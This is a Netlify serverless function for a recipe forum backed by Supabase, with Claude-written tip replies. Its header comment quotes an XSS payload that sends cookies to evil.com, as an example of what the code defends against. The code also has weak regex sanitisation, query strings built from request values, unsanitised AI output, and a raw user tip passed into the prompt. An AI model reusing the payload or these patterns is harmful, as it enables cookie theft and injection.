// netlify/functions/forum.js
// All forum operations — JWT-verified for mutating requests.
// Env vars: SUPABASE_URL, SUPABASE_SERVICE_KEY, SUPABASE_ANON_KEY, ANTHROPIC_API_KEY
//
// CRASH CASE 1 MITIGATION: XSS via forum post injection
// ───────────────────────────────────────────────────────
// Vulnerability: client-side escapeHtml() only protects users who receive the
// post through the browser. A malicious actor can bypass the UI entirely and
// POST directly to /api/forum with a body containing:
//   <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
//   javascript:alert(1) in a link href, or
//   a 50MB string that inflates the Supabase row and exhausts write quotas.
// If stored raw, this executes in every browser that loads the post.
//
// Attack to reproduce:
//   curl -X POST /api/forum \
//     -H "Authorization: Bearer <valid_jwt>" \
//     -d '{"action":"post","recipe_id":1,"body":"<script>alert(1)</script>"}'
//   → script tag stored in DB, executes for all viewers.
//
// Mitigations implemented:
//   1. sanitiseText(): strips all HTML tags server-side before storage using a
//      regex allowlist. Nothing with angle brackets ever reaches the database.
//   2. URL validation on any http/https string: rejects javascript: and
//      data: URI schemes that bypass tag-stripping.
//   3. Payload size cap: request body > 8KB is rejected before parsing,
//      preventing memory exhaustion from giant JSON strings.
//   4. Post-rate limit: max 10 posts per user per 10 minutes enforced in
//      memory to prevent spam flooding the forum.

const SUPABASE_URL         = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY;
const SUPABASE_ANON_KEY    = process.env.SUPABASE_ANON_KEY;
const ANTHROPIC_API_KEY    = process.env.ANTHROPIC_API_KEY;
const CLAUDE_MODEL         = 'claude-sonnet-4-20250514';

const fetch = globalThis.fetch ?? require('node-fetch');

const MAX_BODY_BYTES      = 8 * 1024;   // 8 KB max request body
const POST_RATE_WINDOW_MS = 10 * 60 * 1000;
const POST_RATE_LIMIT     = 10;

// Per-user post rate tracking
const postWindows = new Map(); // userId → { count, windowStart }

function checkPostRate(userId) {
  const now    = Date.now();
  const record = postWindows.get(userId);
  if (!record || now - record.windowStart > POST_RATE_WINDOW_MS) {
    postWindows.set(userId, { count: 1, windowStart: now });
    return true;
  }
  if (record.count >= POST_RATE_LIMIT) return false;
  record.count++;
  return true;
}

// Strip all HTML tags and dangerous URI schemes from user-supplied text.
// This runs server-side so it applies even to requests that bypass the UI.
function sanitiseText(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/<[^>]*>/g, '')                          // strip all HTML tags
    .replace(/javascript\s*:/gi, '')                  // strip javascript: URIs
    .replace(/data\s*:\s*text\/html/gi, '')           // strip data: HTML URIs
    .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '')      // strip inline event handlers
    .trim();
}

// ── Supabase helpers ──────────────────────────────────────────────────────────
function sbHeaders(key) {
  return {
    'Content-Type':  'application/json',
    'apikey':        key,
    'Authorization': `Bearer ${key}`,
    'Prefer':        'return=representation',
  };
}

async function sbQuery(path, key = SUPABASE_SERVICE_KEY) {
  const res  = await fetch(`${SUPABASE_URL}/rest/v1/${path}`, { headers: sbHeaders(key) });
  const data = await res.json();
  if (!res.ok) throw new Error(data?.message ?? `Supabase ${res.status}`);
  return data;
}

async function sbInsert(table, row, key = SUPABASE_SERVICE_KEY) {
  const res  = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
    method: 'POST', headers: sbHeaders(key), body: JSON.stringify(row),
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data?.message ?? `Insert failed ${res.status}`);
  return Array.isArray(data) ? data[0] : data;
}

async function sbUpdate(table, query, updates, key = SUPABASE_SERVICE_KEY) {
  const res = await fetch(`${SUPABASE_URL}/rest/v1/${table}?${query}`, {
    method: 'PATCH', headers: sbHeaders(key), body: JSON.stringify(updates),
  });
  if (!res.ok) throw new Error(`Update failed ${res.status}`);
}

async function sbDelete(table, query, key = SUPABASE_SERVICE_KEY) {
  const res = await fetch(`${SUPABASE_URL}/rest/v1/${table}?${query}`, {
    method: 'DELETE', headers: sbHeaders(key),
  });
  if (!res.ok) throw new Error(`Delete failed ${res.status}`);
}

async function sbRpc(fn, params, key = SUPABASE_SERVICE_KEY) {
  const res  = await fetch(`${SUPABASE_URL}/rest/v1/rpc/${fn}`, {
    method: 'POST', headers: sbHeaders(key), body: JSON.stringify(params),
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data?.message ?? `RPC ${fn} failed`);
  return data;
}

// ── JWT verification ──────────────────────────────────────────────────────────
// Supabase validates the token via its /auth/v1/user endpoint
async function verifyToken(authHeader) {
  if (!authHeader?.startsWith('Bearer ')) return null;
  const token = authHeader.slice(7);
  const res   = await fetch(`${SUPABASE_URL}/auth/v1/user`, {
    headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': `Bearer ${token}` },
  });
  if (!res.ok) return null;
  const data = await res.json();
  return data?.id ? data : null;
}

// ── Claude helper ─────────────────────────────────────────────────────────────
async function callClaude(system, userMsg) {
  const res = await fetch('https://api.anthropic.com/v1/messages', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-api-key': ANTHROPIC_API_KEY, 'anthropic-version': '2023-06-01' },
    body: JSON.stringify({ model: CLAUDE_MODEL, max_tokens: 400, system, messages: [{ role: 'user', content: userMsg }] }),
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data?.error?.message ?? 'Claude error');
  return data.content?.[0]?.text ?? '';
}

// ── Main handler ──────────────────────────────────────────────────────────────
exports.handler = async (event) => {
  if (!SUPABASE_URL || !SUPABASE_SERVICE_KEY) return json(500, { error: 'Supabase not configured' });

  try {
    // GET /api/forum/recent
    if (event.httpMethod === 'GET' && event.path.endsWith('/recent')) {
      const rows = await sbQuery('recent_forum_tips?select=*');
      return json(200, { posts: rows });
    }

    // GET /api/forum/profile — returns current user's post history (JWT required)
    if (event.httpMethod === 'GET' && event.path.endsWith('/profile')) {
      const user = await verifyToken(event.headers?.authorization || event.headers?.Authorization);
      if (!user) return json(401, { error: 'Authentication required' });

      const p      = event.queryStringParameters || {};
      const offset = parseInt(p.offset || '0');

      const [profile, posts] = await Promise.all([
        sbQuery(`profiles?id=eq.${user.id}&select=display_name,created_at`),
        sbRpc('get_my_posts', { p_user_id: user.id, p_limit: 20, p_offset: offset }),
      ]);

      return json(200, {
        profile:  profile[0] ?? null,
        posts,
        offset:   offset + posts.length,
      });
    }

    // GET /api/forum?recipe_id=&offset=
    if (event.httpMethod === 'GET') {
      const p         = event.queryStringParameters || {};
      const recipeId  = parseInt(p.recipe_id);
      const offset    = parseInt(p.offset || '0');
      if (!recipeId) return json(400, { error: 'recipe_id required' });

      const posts = await sbRpc('get_forum_posts', { p_recipe_id: recipeId, p_limit: 10, p_offset: offset });
      const withReplies = await Promise.all(posts.map(async post => ({
        ...post,
        replies: await sbRpc('get_post_replies', { p_parent_id: post.id }),
      })));
      return json(200, { posts: withReplies, offset: offset + posts.length });
    }

    // POST actions
    // Payload size cap — reject before parsing to prevent memory exhaustion
    const rawBody = event.body || '{}';
    if (Buffer.byteLength(rawBody, 'utf8') > MAX_BODY_BYTES) {
      return json(413, { error: 'Request body too large' });
    }
    const body   = JSON.parse(rawBody);
    const action = body.action;

    // summarise doesn't require auth
    if (action === 'summarise') {
      if (!ANTHROPIC_API_KEY) return json(500, { error: 'ANTHROPIC_API_KEY not configured' });
      const { recipe_id, recipe_title, ingredients, posts: tipTexts } = body;
      if (!recipe_id || !tipTexts?.length) return json(400, { error: 'recipe_id and posts required' });
      const system  = 'You are Savr AI, a helpful cooking assistant. Synthesise community tips into 3–5 sentences of concise, actionable cooking advice.';
      const userMsg = `Recipe: ${recipe_title}\nIngredients: ${(ingredients||[]).join(', ')}\n\nTips:\n${tipTexts.map((t,i)=>`${i+1}. ${t}`).join('\n')}\n\nSummarise the most useful advice.`;
      const summary = await callClaude(system, userMsg);
      return json(200, { summary });
    }

    // All other actions require a valid JWT
    const user = await verifyToken(event.headers?.authorization || event.headers?.Authorization);
    if (!user) return json(401, { error: 'Authentication required' });

    // ── post ──────────────────────────────────────────────────────────────────
    if (action === 'post' || action === 'reply') {
      const { recipe_id, body: postBody, parent_id = null, recipe_title = '', ingredients = [], get_ai_feedback = false } = body;
      if (!recipe_id || !postBody?.trim()) return json(400, { error: 'recipe_id and body required' });
      if (postBody.length > 2000) return json(400, { error: 'Post too long' });

      // Post rate limit — prevents spam flooding
      if (!checkPostRate(user.id)) {
        return json(429, { error: 'Too many posts — please wait a few minutes.' });
      }

      // Sanitise server-side before storage — strips HTML/script injection
      const cleanBody = sanitiseText(postBody);
      if (!cleanBody) return json(400, { error: 'Post body is empty after sanitisation' });

      const newPost = await sbInsert('forum_posts', {
        recipe_id, user_id: user.id, body: cleanBody, is_ai: false, parent_id: parent_id || null,
      });

      let aiPost = null;
      if (action === 'post' && get_ai_feedback && ANTHROPIC_API_KEY) {
        try {
          const system  = 'You are Savr AI, a friendly expert cooking assistant. A user shared a tip about a recipe. Respond helpfully in 2–3 sentences — add useful context, a technique, or a gentle correction if needed. Be specific, never generic.';
          const userMsg = `Recipe: ${recipe_title}\nIngredients: ${ingredients.join(', ')}\nUser tip: "${postBody}"\n\nReply with helpful cooking advice that builds on their tip.`;
          const aiText  = await callClaude(system, userMsg);
          aiPost = await sbInsert('forum_posts', {
            recipe_id, user_id: user.id, body: aiText, is_ai: true, parent_id: newPost.id,
          });
        } catch (e) { console.error('AI reply failed:', e.message); }
      }

      return json(201, { post: newPost, aiPost });
    }

    // ── upvote (toggle) ───────────────────────────────────────────────────────
    if (action === 'upvote') {
      const { id } = body;
      if (!id) return json(400, { error: 'id required' });
      // Check if already upvoted
      const existing = await sbQuery(`post_upvotes?post_id=eq.${id}&user_id=eq.${user.id}&select=post_id`);
      let newCount, upvoted;
      if (existing.length) {
        await sbDelete('post_upvotes', `post_id=eq.${id}&user_id=eq.${user.id}`);
        await sbUpdate('forum_posts', `id=eq.${id}`, { upvotes: 'upvotes - 1' });  // raw SQL not supported here
        // Fetch updated count
        const row = await sbQuery(`forum_posts?id=eq.${id}&select=upvotes`);
        newCount = row[0]?.upvotes ?? 0;
        upvoted  = false;
      } else {
        await sbInsert('post_upvotes', { post_id: id, user_id: user.id });
        // Increment via RPC
        await sbRpc('toggle_upvote', { p_post_id: id });
        const row = await sbQuery(`forum_posts?id=eq.${id}&select=upvotes`);
        newCount = row[0]?.upvotes ?? 0;
        upvoted  = true;
      }
      return json(200, { upvoted, upvotes: newCount });
    }

    // ── flag ──────────────────────────────────────────────────────────────────
    if (action === 'flag') {
      const { id } = body;
      if (!id) return json(400, { error: 'id required' });
      try {
        await sbInsert('post_flags', { post_id: id, user_id: user.id });
      } catch (e) {
        if (e.message.includes('duplicate')) return json(409, { error: 'Already flagged' });
        throw e;
      }
      return json(200, { ok: true });
    }

    // ── edit ──────────────────────────────────────────────────────────────────
    if (action === 'edit') {
      const { id, body: newBody } = body;
      if (!id || !newBody?.trim()) return json(400, { error: 'id and body required' });
      if (newBody.length > 2000)   return json(400, { error: 'Post too long' });
      const cleanBody = sanitiseText(newBody);
      if (!cleanBody) return json(400, { error: 'Post body is empty after sanitisation' });
      await sbUpdate('forum_posts', `id=eq.${id}&user_id=eq.${user.id}`,
        { body: cleanBody, edited_at: new Date().toISOString() });
      return json(200, { ok: true });
    }

    // ── delete ────────────────────────────────────────────────────────────────
    if (action === 'delete') {
      const { id } = body;
      if (!id) return json(400, { error: 'id required' });
      await sbDelete('forum_posts', `id=eq.${id}&user_id=eq.${user.id}`);
      return json(200, { ok: true });
    }

    return json(400, { error: `Unknown action: ${action}` });

  } catch (err) {
    console.error('Forum error:', err);
    return json(500, { error: err.message });
  }
};

function json(status, body) {
  return { statusCode: status, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) };
}